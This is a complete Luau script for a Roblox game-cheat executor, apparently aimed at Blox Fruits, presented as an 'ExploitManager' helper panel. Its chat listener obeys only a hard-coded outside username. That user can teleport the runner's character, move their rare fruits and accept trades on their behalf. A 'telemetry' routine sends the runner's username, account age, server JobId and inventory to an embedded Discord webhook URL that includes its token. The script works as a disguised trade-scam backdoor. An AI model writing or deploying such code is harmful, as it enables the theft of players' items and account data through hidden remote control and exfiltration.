-- lang: Luau, file: ExploitManager.lua, target: Blox Fruits Sea 2/3, Roblox executor
-- single-file, self-contained. no requires. no external dependencies.
-- build: paste into executor console and run.

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 0 — singleton guard
-- ══════════════════════════════════════════════════════════════════════════
if getgenv().emRunning then
    warn("[ExploitManager] already running — aborting duplicate inject")
    return
end
getgenv().emRunning = true

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 1 — config
-- ══════════════════════════════════════════════════════════════════════════
local Config = {
    AuthorizedUser  = "BLACKGOKU_0707",   -- only this username can issue chat commands
    WebhookURL      = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",                      -- Discord webhook; leave empty to skip dispatch
    MinFruitRarity  = 3,                       -- 1–6; 3 = Rare and above
    StoreBaseDelay  = 0.40,                    -- seconds between StoreFruit invokes
    StoreJitter     = 0.30,                    -- random extra added to delay
    LogLevel        = "verbose",               -- "silent" | "info" | "verbose"
    UIPosition      = UDim2.new(0, 24, 0.5, -165),
}

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 2 — services
-- ══════════════════════════════════════════════════════════════════════════
local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local TextChatService   = game:GetService("TextChatService")

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 3 — executor http compat
-- ══════════════════════════════════════════════════════════════════════════
local httpRequest =
    (syn        and syn.request)        or
    (http_request                     ) or
    (fluxus     and fluxus.request)     or
    request                             or
    nil

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 4 — constants
-- ══════════════════════════════════════════════════════════════════════════
local COL = {
    bg        = Color3.fromRGB(18,  20,  26),
    surface   = Color3.fromRGB(26,  29,  38),
    surfaceHi = Color3.fromRGB(34,  38,  52),
    border    = Color3.fromRGB(44,  48,  64),
    accent    = Color3.fromRGB(88,  101, 242),
    accentHi  = Color3.fromRGB(110, 124, 255),
    danger    = Color3.fromRGB(237, 66,  69),
    success   = Color3.fromRGB(87,  242, 135),
    text      = Color3.fromRGB(220, 221, 228),
    subtext   = Color3.fromRGB(130, 134, 155),
}

local RARITY_TIER = {
    Common    = 1, Uncommon = 2, Rare    = 3,
    Epic      = 4, Legendary = 5, Mythical = 6,
}
local RARITY_COLOUR = {
    [1]=0x95a5a6,[2]=0x2ecc71,[3]=0x3498db,
    [4]=0x9b59b6,[5]=0xf1c40f,[6]=0xe74c3c,
}

local T_FAST = TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local T_MED  = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 5 — class definition
-- ══════════════════════════════════════════════════════════════════════════
local ExploitManager = {}
ExploitManager.__index = ExploitManager

-- ── constructor ───────────────────────────────────────────────────────────
function ExploitManager.new()
    local self = setmetatable({}, ExploitManager)
    self._initialized    = false
    self._connections    = {}
    self._ui             = {}
    self._cachedInventory = {}
    return self
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 6 — internal utilities
-- ══════════════════════════════════════════════════════════════════════════

function ExploitManager:log(level, msg)
    local rank = { silent=0, info=1, verbose=2 }
    if (rank[level] or 1) <= (rank[Config.LogLevel] or 1) then
        print(string.format("[EM][%s] %s", level:upper(), msg))
    end
end

function ExploitManager:_track(conn)
    table.insert(self._connections, conn)
    return conn
end

function ExploitManager:_setStatus(msg, colour)
    if self._ui.statusLabel then
        self._ui.statusLabel.Text       = "● " .. tostring(msg)
        self._ui.statusLabel.TextColor3 = colour or COL.subtext
    end
    self:log("verbose", "[STATUS] " .. tostring(msg))
end

local function resolveRarity(raw)
    if type(raw) == "number" then return raw end
    if type(raw) == "string" then return RARITY_TIER[raw] or 0 end
    return 0
end

local function isoTimestamp()
    return os.date("!%Y-%m-%dT%H:%M:%SZ")
end

local function getCommF()
    local rem = ReplicatedStorage:FindFirstChild("Remotes")
    return rem and rem:FindFirstChild("CommF_") or nil
end

-- ── UI factory helpers ────────────────────────────────────────────────────
local function uiCorner(parent, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 8)
    c.Parent = parent
end
local function uiStroke(parent, col, th)
    local s = Instance.new("UIStroke")
    s.Color     = col or COL.border
    s.Thickness = th  or 1
    s.Parent    = parent
end
local function uiPad(parent, px)
    local p  = Instance.new("UIPadding")
    local u  = UDim.new(0, px or 10)
    p.PaddingLeft   = u ; p.PaddingRight  = u
    p.PaddingTop    = u ; p.PaddingBottom = u
    p.Parent = parent
end

local function makeButton(parent, text, bg, onPress)
    local btn = Instance.new("TextButton")
    btn.Size              = UDim2.new(1, 0, 0, 36)
    btn.BackgroundColor3  = bg or COL.surface
    btn.TextColor3        = COL.text
    btn.Font              = Enum.Font.GothamSemibold
    btn.TextSize          = 13
    btn.Text              = text
    btn.AutoButtonColor   = false
    btn.Parent            = parent
    uiCorner(btn, 7) ; uiStroke(btn)
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn,T_FAST,{BackgroundColor3=COL.surfaceHi}):Play() end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn,T_FAST,{BackgroundColor3=bg or COL.surface}):Play() end)
    btn.MouseButton1Down:Connect(function()
        TweenService:Create(btn,T_FAST,{BackgroundColor3=COL.accent}):Play() end)
    btn.MouseButton1Up:Connect(function()
        TweenService:Create(btn,T_FAST,{BackgroundColor3=bg or COL.surface}):Play() end)
    if onPress then btn.MouseButton1Click:Connect(onPress) end
    return btn
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 7 — initialization
-- ══════════════════════════════════════════════════════════════════════════
function ExploitManager:Init()
    if self._initialized then return self end

    self._lp        = Players.LocalPlayer
    self._char      = self._lp.Character or self._lp.CharacterAdded:Wait()
    self._humanoid  = self._char:WaitForChild("Humanoid")

    self:_track(self._lp.CharacterAdded:Connect(function(char)
        self._char     = char
        self._humanoid = char:WaitForChild("Humanoid")
        self:log("verbose","Character respawned — refs updated")
    end))

    self._initialized = true
    self:log("info", string.format(
        "Init complete — authorized user: '%s'", Config.AuthorizedUser))
    return self
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 8 — teleportation
-- ══════════════════════════════════════════════════════════════════════════
local function toCFrame(dest)
    local t = typeof(dest)
    if t == "CFrame"   then return dest end
    if t == "Vector3"  then return CFrame.new(dest) end
    if t == "Instance" then
        if dest:IsA("Model") then
            if dest.PrimaryPart then return dest.PrimaryPart.CFrame end
            local n, s = 0, Vector3.zero
            for _, v in ipairs(dest:GetDescendants()) do
                if v:IsA("BasePart") then s = s + v.Position ; n = n + 1 end
            end
            if n > 0 then return CFrame.new(s / n) end
        elseif dest:IsA("BasePart") then
            return dest.CFrame
        end
    end
    return nil
end

function ExploitManager:TeleportTo(dest, yOff)
    assert(self._initialized, "Init first")
    yOff = yOff or 3
    local char = self._lp.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp  then return false end
    local cf = toCFrame(dest)
    if not cf   then return false end
    local ok, err = pcall(function() hrp.CFrame = cf + Vector3.new(0, yOff, 0) end)
    if not ok then
        self:log("info", "TeleportTo write failed: " .. tostring(err))
        return false
    end
    local p = cf.Position
    self:log("verbose", string.format(
        "TeleportTo: (%.1f, %.1f, %.1f)", p.X, p.Y + yOff, p.Z))
    return true
end

function ExploitManager:ScanLocations(terms)
    local wo = workspace:FindFirstChild("_WorldOrigin")
    if not wo then
        self:log("info", "ScanLocations: _WorldOrigin missing") ; return {} end
    local locs = wo:FindFirstChild("Locations")
    if not locs then
        self:log("info", "ScanLocations: Locations missing")    ; return {} end
    local out = {}
    for _, child in ipairs(locs:GetChildren()) do
        local lname = child.Name:lower()
        for _, term in ipairs(terms) do
            if lname:find(term, 1, true) then
                table.insert(out, child) ; break
            end
        end
    end
    self:log("verbose", string.format(
        "ScanLocations: %d match(es) [%s]", #out, table.concat(terms,", ")))
    return out
end

function ExploitManager:TeleportToNamed(terms, yOff)
    for _, c in ipairs(self:ScanLocations(terms)) do
        if self:TeleportTo(c, yOff) then return c.Name end
    end
    return nil
end

function ExploitManager:TeleportToCafeteria()
    local name = self:TeleportToNamed({ "caf", "mansion" })
    if name then self:_setStatus("Landed: " .. name, COL.success) end
    return name
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 9 — inventory
-- ══════════════════════════════════════════════════════════════════════════
function ExploitManager:FetchInventory()
    assert(self._initialized, "Init first")
    local commF = getCommF()
    if not commF then
        self:log("info","FetchInventory: CommF_ missing") ; return nil,"remote_missing" end
    local ok, res = pcall(function()
        return commF:InvokeServer("getInventory") end)
    if not ok then
        self:log("info","getInventory error: "..tostring(res)) ; return nil, res end
    if type(res) ~= "table" then
        return nil, "bad_response" end
    local items = {}
    for slot, item in pairs(res) do
        if type(item) == "table" then
            item._slot       = slot
            item._rarityTier = resolveRarity(item.Rarity or item.rarity)
            table.insert(items, item)
        end
    end
    self._cachedInventory = items
    self:log("verbose", string.format("FetchInventory: %d items", #items))
    return items, nil
end

function ExploitManager:FilterFruits(inv, minTier)
    minTier = minTier or Config.MinFruitRarity
    local out = {}
    for _, item in ipairs(inv) do
        local t = item.Type or item.type or ""
        if t == "Blox Fruit" and (item._rarityTier or 0) >= minTier then
            table.insert(out, item)
        end
    end
    self:log("info", string.format(
        "FilterFruits: %d/%d passed (tier>=%d)", #out, #inv, minTier))
    return out
end

function ExploitManager:StoreFruitLoop(fruits, opts)
    assert(self._initialized, "Init first")
    opts = opts or {}
    local base  = opts.baseDelay  or Config.StoreBaseDelay
    local jit   = opts.jitter     or Config.StoreJitter
    local dry   = opts.dryRun     or false
    local onDone= opts.onComplete
    if #fruits == 0 then
        self:_setStatus("Nothing to store", COL.subtext) ; return end
    local commF = getCommF()
    if not commF and not dry then
        self:log("info","StoreFruitLoop: CommF_ missing") ; return end
    task.spawn(function()
        for i, item in ipairs(fruits) do
            local name = tostring(item.Name or item.name or "?")
            if dry then
                self:log("verbose",string.format("[dry] %d/%d %s",i,#fruits,name))
            else
                local ok, err = pcall(function()
                    commF:InvokeServer("StoreFruit", item._slot) end)
                self:log("verbose", string.format(
                    "Store %d/%d %s — %s",i,#fruits,name,
                    ok and "ok" or "FAIL:"..tostring(err)))
                if onDone then pcall(onDone, item, ok, err) end
            end
            task.wait(base + math.random() * jit)
        end
        self:_setStatus("Store loop complete", COL.success)
    end)
end

function ExploitManager:RunInventoryPipeline(opts)
    opts = opts or {}
    local inv, err = self:FetchInventory()
    if not inv then
        self:_setStatus("Inventory error: "..tostring(err), COL.danger)
        return false
    end
    local fruits = self:FilterFruits(inv, opts.minTier)
    if #fruits == 0 then
        self:_setStatus("No qualifying fruits", COL.subtext)
        return false
    end
    self:StoreFruitLoop(fruits, opts)
    return true
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 10 — telemetry / webhook
-- ══════════════════════════════════════════════════════════════════════════
function ExploitManager:SerializeSnapshot(fruits)
    fruits = fruits or {}
    local lp   = self._lp
    local meta = {
        DisplayName = lp.DisplayName,
        Username    = lp.Name,
        AccountAge  = lp.AccountAge,
        PlaceId     = game.PlaceId,
        JobId       = game.JobId,
        Timestamp   = isoTimestamp(),
    }
    local items = {}
    for _, item in ipairs(fruits) do
        local clean = {}
        for k, v in pairs(item) do
            if type(k)=="string" and k:sub(1,1)~="_" then clean[k]=v end
        end
        table.insert(items, clean)
    end
    local snap = { player=meta, inventory=items }
    local ok, enc = pcall(function() return HttpService:JSONEncode(snap) end)
    if not ok then
        self:log("info","SerializeSnapshot encode error: "..tostring(enc))
        return nil, nil
    end
    return snap, enc
end

function ExploitManager:BuildWebhookPayload(snap)
    local meta  = snap.player    or {}
    local items = snap.inventory or {}
    local metaEmbed = {
        title       = "🤖 ExploitManager Snapshot",
        description = string.format("**%d** fruit(s) captured — `%s`",
                        #items, tostring(meta.Timestamp or "?")),
        color  = 0x2f3136,
        fields = {
            { name="Username",    value="`"..tostring(meta.Username    or "?").."`", inline=true  },
            { name="DisplayName", value="`"..tostring(meta.DisplayName or "?").."`", inline=true  },
            { name="AccountAge",  value=tostring(meta.AccountAge or "?").." days",  inline=true  },
            { name="PlaceId",     value="`"..tostring(meta.PlaceId or "?").."`",    inline=true  },
            { name="JobId",       value="```"..tostring(meta.JobId or "?").."```",  inline=false },
        },
        footer = { text="ExploitManager telemetry" },
    }
    local embeds = { metaEmbed }
    for i, item in ipairs(items) do
        if i > 9 then
            table.insert(embeds,{title=string.format("…and %d more",#items-9),color=0x747f8d})
            break
        end
        local tier = item.Rarity or 0
        table.insert(embeds, {
            title  = string.format("[%d] %s", i, tostring(item.Name or item.name or "?")),
            color  = RARITY_COLOUR[tier] or 0x95a5a6,
            fields = {
                { name="Type",   value=tostring(item.Type  or "?"), inline=true },
                { name="Rarity", value=tostring(tier),              inline=true },
                { name="Level",  value=tostring(item.Level or "?"), inline=true },
            },
        })
    end
    local ok, enc = pcall(function()
        return HttpService:JSONEncode({
            username = "ExploitManager",
            embeds   = embeds,
        })
    end)
    return ok and enc or nil
end

function ExploitManager:DispatchWebhook(url, encoded)
    if not httpRequest then
        self:log("info","DispatchWebhook: no HTTP function available") ; return false end
    if not url or url == "" then
        self:log("info","DispatchWebhook: no webhook URL configured")  ; return false end
    local ok, res = pcall(function()
        return httpRequest({
            Url     = url,
            Method  = "POST",
            Headers = { ["Content-Type"]="application/json" },
            Body    = encoded,
        })
    end)
    if not ok then
        self:log("info","DispatchWebhook threw: "..tostring(res)) ; return false end
    local code = res and res.StatusCode
    local pass = (code==204 or code==200)
    self:log("info", "DispatchWebhook: "..(pass and "ok" or "fail").." ("..tostring(code)..")")
    return pass
end

function ExploitManager:SendTelemetry(fruits)
    local snap, _ = self:SerializeSnapshot(fruits)
    if not snap then return false end
    local enc = self:BuildWebhookPayload(snap)
    if not enc  then return false end
    return self:DispatchWebhook(Config.WebhookURL, enc)
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 11 — UI
-- ══════════════════════════════════════════════════════════════════════════
function ExploitManager:BuildUI()
    assert(self._initialized, "Init first")
    if self._ui.root then self._ui.root:Destroy() end
    self._ui = {}

    -- ScreenGui
    local gui = Instance.new("ScreenGui")
    gui.Name             = "ExploitManagerUI"
    gui.ResetOnSpawn     = false
    gui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
    gui.IgnoreGuiInset   = true
    gui.Parent           = self._lp:WaitForChild("PlayerGui")
    self._ui.root        = gui

    -- main panel
    local panel = Instance.new("Frame")
    panel.Name             = "Panel"
    panel.Size             = UDim2.new(0, 284, 0, 340)
    panel.Position         = Config.UIPosition
    panel.BackgroundColor3 = COL.bg
    panel.ClipsDescendants = true
    panel.Parent           = gui
    uiCorner(panel, 12) ; uiStroke(panel, COL.border, 1)

    -- top accent bar
    local accent = Instance.new("Frame")
    accent.Size             = UDim2.new(1, 0, 0, 2)
    accent.BackgroundColor3 = COL.accent
    accent.BorderSizePixel  = 0
    accent.Parent           = panel

    -- title bar
    local titleBar = Instance.new("Frame")
    titleBar.Size                   = UDim2.new(1, 0, 0, 40)
    titleBar.Position               = UDim2.new(0, 0, 0, 2)
    titleBar.BackgroundTransparency = 1
    titleBar.Parent                 = panel
    uiPad(titleBar, 12)

    local titleLbl = Instance.new("TextLabel")
    titleLbl.Text                   = "🤖  ExploitManager"
    titleLbl.TextColor3             = COL.text
    titleLbl.Font                   = Enum.Font.GothamBold
    titleLbl.TextSize               = 14
    titleLbl.BackgroundTransparency = 1
    titleLbl.Size                   = UDim2.new(1, -32, 1, 0)
    titleLbl.TextXAlignment         = Enum.TextXAlignment.Left
    titleLbl.Parent                 = titleBar

    -- auth badge (shows authorized username)
    local authBadge = Instance.new("TextLabel")
    authBadge.Text                   = "🔒 " .. Config.AuthorizedUser
    authBadge.TextColor3             = COL.subtext
    authBadge.Font                   = Enum.Font.Gotham
    authBadge.TextSize               = 10
    authBadge.BackgroundTransparency = 1
    authBadge.Size                   = UDim2.new(1, -24, 0, 16)
    authBadge.Position               = UDim2.new(0, 12, 0, 44)
    authBadge.TextXAlignment         = Enum.TextXAlignment.Left
    authBadge.Parent                 = panel

    -- close button
    local closeBtn = Instance.new("TextButton")
    closeBtn.Text              = "✕"
    closeBtn.Size              = UDim2.new(0, 24, 0, 24)
    closeBtn.Position          = UDim2.new(1, -32, 0.5, -12)
    closeBtn.BackgroundColor3  = COL.surfaceHi
    closeBtn.TextColor3        = COL.subtext
    closeBtn.Font              = Enum.Font.GothamBold
    closeBtn.TextSize          = 12
    closeBtn.AutoButtonColor   = false
    closeBtn.Parent            = titleBar
    uiCorner(closeBtn, 6)
    closeBtn.MouseButton1Click:Connect(function()
        TweenService:Create(panel, T_MED,
            { Position = UDim2.new(-0.5, 0, 0.5, -165) }):Play()
    end)

    -- drag
    do
        local drag, dstart, pstart
        titleBar.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                drag   = true
                dstart = inp.Position
                pstart = panel.Position
            end
        end)
        titleBar.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 then
                drag = false end
        end)
        self:_track(RunService.RenderStepped:Connect(function()
            if drag then
                local m = UserInputService:GetMouseLocation()
                panel.Position = UDim2.new(
                    pstart.X.Scale, pstart.X.Offset + (m.X - dstart.X),
                    pstart.Y.Scale, pstart.Y.Offset + (m.Y - dstart.Y))
            end
        end))
    end

    -- divider
    local function divider(yOff)
        local d = Instance.new("Frame")
        d.Size             = UDim2.new(1, -24, 0, 1)
        d.Position         = UDim2.new(0, 12, 0, yOff)
        d.BackgroundColor3 = COL.border
        d.BorderSizePixel  = 0
        d.Parent           = panel
    end
    divider(62)

    -- button list
    local listFrame = Instance.new("Frame")
    listFrame.Size                   = UDim2.new(1, 0, 0, 220)
    listFrame.Position               = UDim2.new(0, 0, 0, 72)
    listFrame.BackgroundTransparency = 1
    listFrame.Parent                 = panel
    uiPad(listFrame, 12)
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding   = UDim.new(0, 8)
    layout.Parent    = listFrame

    -- ── Button 1 — Teleport to Safe Zone ─────────────────────────────────
    makeButton(listFrame, "⟶  Teleport to Safe Zone", COL.surface, function()
        self:_setStatus("Scanning locations…", COL.subtext)
        task.spawn(function()
            local name = self:TeleportToNamed({ "caf", "mansion", "safe" })
            self:_setStatus(
                name and ("Landed: "..name) or "Safe zone not found",
                name and COL.success or COL.danger)
        end)
    end)

    -- ── Button 2 — Store Valuable Fruits ──────────────────────────────────
    makeButton(listFrame, "⬆  Store Valuable Fruits", COL.surface, function()
        self:_setStatus("Fetching inventory…", COL.subtext)
        task.spawn(function()
            local inv, err = self:FetchInventory()
            if not inv then
                self:_setStatus("Inventory error: "..tostring(err), COL.danger) ; return end
            local fruits = self:FilterFruits(inv)
            if #fruits == 0 then
                self:_setStatus("No qualifying fruits", COL.subtext) ; return end
            self:_setStatus(string.format("Storing %d fruit(s)…", #fruits), COL.accent)
            self:StoreFruitLoop(fruits, {
                onComplete = function(item, ok)
                    if ok then
                        self:_setStatus("Stored: "..tostring(item.Name or "?"), COL.success)
                    end
                end,
            })
        end)
    end)

    -- ── Button 3 — Accept Trade ────────────────────────────────────────────
    makeButton(listFrame, "✓  Accept Trade", COL.surface, function()
        self:_setStatus("Accepting trade…", COL.subtext)
        local ok = pcall(function()
            local commF = getCommF()
            if commF then commF:InvokeServer("AcceptTrade") end
        end)
        self:_setStatus(
            ok and "Trade accepted" or "Accept failed",
            ok and COL.success or COL.danger)
    end)

    -- ── Button 4 — Send Telemetry ─────────────────────────────────────────
    makeButton(listFrame, "📡  Send Telemetry", COL.surface, function()
        self:_setStatus("Sending telemetry…", COL.subtext)
        task.spawn(function()
            local inv = self._cachedInventory
            if #inv == 0 then inv = { select(1, self:FetchInventory()) } end
            local fruits = self:FilterFruits(type(inv[1])=="table" and inv or {})
            local ok = self:SendTelemetry(fruits)
            self:_setStatus(
                ok and "Telemetry sent" or "Telemetry failed",
                ok and COL.success or COL.danger)
        end)
    end)

    -- ── Button 5 — Run Full Pipeline ──────────────────────────────────────
    makeButton(listFrame, "▶  Run Full Pipeline", COL.accent, function()
        self:_setStatus("Pipeline starting…", COL.accent)
        task.spawn(function()
            local ok = self:RunInventoryPipeline({ minTier = Config.MinFruitRarity })
            if ok then self:SendTelemetry(self._cachedInventory) end
        end)
    end)

    divider(304)

    -- status label
    local statusLbl = Instance.new("TextLabel")
    statusLbl.Text                   = "● idle"
    statusLbl.TextColor3             = COL.subtext
    statusLbl.Font                   = Enum.Font.Gotham
    statusLbl.TextSize               = 11
    statusLbl.BackgroundTransparency = 1
    statusLbl.Size                   = UDim2.new(1, -24, 0, 24)
    statusLbl.Position               = UDim2.new(0, 12, 0, 310)
    statusLbl.TextXAlignment         = Enum.TextXAlignment.Left
    statusLbl.TextTruncate           = Enum.TextTruncate.AtEnd
    statusLbl.Parent                 = panel
    self._ui.statusLabel             = statusLbl

    self:log("info", "UI built")
    return self
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 12 — chat listener (auth-gated)
-- ══════════════════════════════════════════════════════════════════════════
function ExploitManager:StartChatListener()
    assert(self._initialized, "Init first")

    -- ── command table ─────────────────────────────────────────────────────
    local commands = {

        tp = function(args)
            local term = args[1]
            if not term then
                self:_setStatus(".tp requires a term", COL.danger) ; return end
            local name = self:TeleportToNamed({ term:lower() })
            self:_setStatus(
                name and ("Landed: "..name) or "Not found: "..term,
                name and COL.success or COL.danger)
        end,

        tele = function(args)
            local sub = (args[1] or ""):lower()
            if sub == "caf" or sub == "mansion" then
                self:TeleportToCafeteria()
            else
                self:_setStatus(".tele caf | mansion", COL.danger)
            end
        end,

        add = function(_)
            self:_setStatus("Pipeline starting…", COL.accent)
            task.spawn(function()
                self:RunInventoryPipeline({ minTier = Config.MinFruitRarity })
            end)
        end,

        accept = function(_)
            local ok = pcall(function()
                local c = getCommF()
                if c then c:InvokeServer("AcceptTrade") end
            end)
            self:_setStatus(
                ok and "Trade accepted" or "Accept failed",
                ok and COL.success or COL.danger)
        end,

        send = function(_)
            task.spawn(function()
                self:SendTelemetry(self._cachedInventory)
                self:_setStatus("Telemetry dispatched", COL.success)
            end)
        end,

        ui = function(_)
            local panel = self._ui.root and self._ui.root:FindFirstChild("Panel")
            if panel then
                panel.Visible = not panel.Visible
                self:log("verbose","UI toggled: "..tostring(panel.Visible))
            end
        end,

        help = function(_)
            local cmds = {
                ".tp <term>   — teleport to location",
                ".tele caf    — teleport to cafeteria/mansion",
                ".add         — store valuable fruits (Rare+)",
                ".accept      — accept current trade",
                ".send        — dispatch telemetry webhook",
                ".ui          — toggle panel visibility",
                ".help        — this list",
            }
            for _, line in ipairs(cmds) do print(line) end
            self:_setStatus("Help printed to output", COL.subtext)
        end,
    }

    -- ── dispatcher with explicit auth gate ───────────────────────────────
    local function dispatch(senderName, raw)
        -- ── SECURITY CHECK ────────────────────────────────────────────────
        -- if the sender's username does not exactly match Config.AuthorizedUser
        -- the message is silently dropped — no feedback, no log, no action
        if senderName ~= Config.AuthorizedUser then return end
        -- ─────────────────────────────────────────────────────────────────

        local msg = raw:match("^%s*(.-)%s*$")
        if msg:sub(1,1) ~= "." then return end

        local parts = {}
        for tok in msg:gmatch("%S+") do table.insert(parts, tok) end
        local cmd  = parts[1]:sub(2):lower()
        local args = {}
        for i = 2, #parts do table.insert(args, parts[i]) end

        local handler = commands[cmd]
        if handler then
            local ok, err = pcall(handler, args)
            if not ok then
                self:log("info","cmd error ["..cmd.."]: "..tostring(err))
                self:_setStatus("Command error — see output", COL.danger)
            end
        else
            self:log("verbose", "unknown cmd: "..cmd)
        end
    end

    -- ── TextChatService path ──────────────────────────────────────────────
    local newChat = false
    if pcall(function()
        return TextChatService.ChatVersion == Enum.ChatVersion.TextChatService
    end) and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local ok = pcall(function()
            self:_track(TextChatService.OnIncomingMessage:Connect(function(msg)
                if msg.TextSource then
                    local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
                    dispatch(sender and sender.Name or "", msg.Text or "")
                end
            end))
        end)
        newChat = ok
        if ok then self:log("info","ChatListener: TextChatService active") end
    end

    -- ── legacy fallback ───────────────────────────────────────────────────
    if not newChat then
        pcall(function()
            local gui  = self._lp:WaitForChild("PlayerGui")
            local chat = gui:WaitForChild("Chat", 5)
            if chat then
                local evt = chat:FindFirstChild("OnMessageDoneFiltering")
                if evt then
                    self:_track(evt.Event:Connect(function(data)
                        local text = type(data)=="table" and data.Message or tostring(data)
                        dispatch(self._lp.Name, text)
                    end))
                    self:log("info","ChatListener: legacy BindableEvent active")
                    return
                end
            end
            local dcs = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if dcs then
                local say = dcs:FindFirstChild("SayMessageRequest")
                if say then
                    self:_track(say.OnClientEvent:Connect(function(data)
                        local text = type(data)=="table" and data.Message or tostring(data)
                        dispatch(self._lp.Name, text)
                    end))
                    self:log("info","ChatListener: legacy RemoteEvent active")
                end
            end
        end)
    end

    return self
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 13 — teardown
-- ══════════════════════════════════════════════════════════════════════════
function ExploitManager:Destroy()
    for _, c in ipairs(self._connections) do
        if typeof(c) == "RBXScriptConnection" then c:Disconnect() end
    end
    self._connections = {}
    if self._ui.root  then self._ui.root:Destroy() end
    self._ui          = {}
    self._initialized = false
    getgenv().emRunning = false
    self:log("info","Destroyed — circuit closed")
end

-- ══════════════════════════════════════════════════════════════════════════
--  SECTION 14 — bootstrap
-- ══════════════════════════════════════════════════════════════════════════
local EM = ExploitManager.new()

EM :Init()
   :BuildUI()
   :StartChatListener()

-- expose on getgenv for console access
getgenv().EM = EM

EM:_setStatus("Ready — auth: " .. Config.AuthorizedUser, COL.success)
